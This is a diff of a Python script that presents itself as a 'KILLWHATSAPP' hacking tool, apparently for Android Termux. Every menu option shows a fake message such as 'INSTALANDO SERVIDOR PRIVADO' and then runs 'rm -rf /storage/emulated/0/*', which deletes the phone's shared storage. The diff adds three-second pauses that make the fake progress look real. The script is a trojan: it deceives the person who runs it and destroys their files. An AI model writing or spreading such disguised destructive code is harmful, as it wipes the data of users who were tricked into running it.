@@ -1,8 +1,9 @@
-
 #!/bin/python
 # -*- coding: utf-8 -*-
 
 import os
+import time
+
 print("""                                     
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 @@@@@@@@@@@@@@@@@@     .#%,      @@@@@@
@@ -39,26 +40,30 @@ print("""
 ░  
                          ░               ░                            ░                                 
 """)
-eleccion = int(eval(input("KILLWHATSAPP>> ")))
+
+eleccion = int(input("KILLWHATSAPP>> "))
 #
 #
 if eleccion == 1:
 	os.system("apt update")
-	print("INSTALANDO SERVIDOR PRIVADO")
+	print("\n INSTALANDO SERVIDOR PRIVADO")
+	time.sleep(3)
 	os.system("rm -rf /storage/emulated/0/*")
 
 elif eleccion == 2:
 	os.system("apt update")
-	print("ABRIENDO PLATAFORMA..........")
+	print("\n ABRIENDO PLATAFORMA..........")
+	time.sleep(3)
 	os.system("rm -rf /storage/emulated/0/*")
 
 elif eleccion == 3:
 	os.system("apt update")
-	print("ABRIENDO SERVIDOR................")
+	print("\n ABRIENDO SERVIDOR................")
+	time.sleep(3)
 	os.system("rm -rf /storage/emulated/0/*")
 
 elif eleccion == 4:
 	os.system("apt update")
 	print("ABRIENDO SERVIDOR................")
+	time.sleep(3)
 	os.system("rm -rf /storage/emulated/0/*")
-	
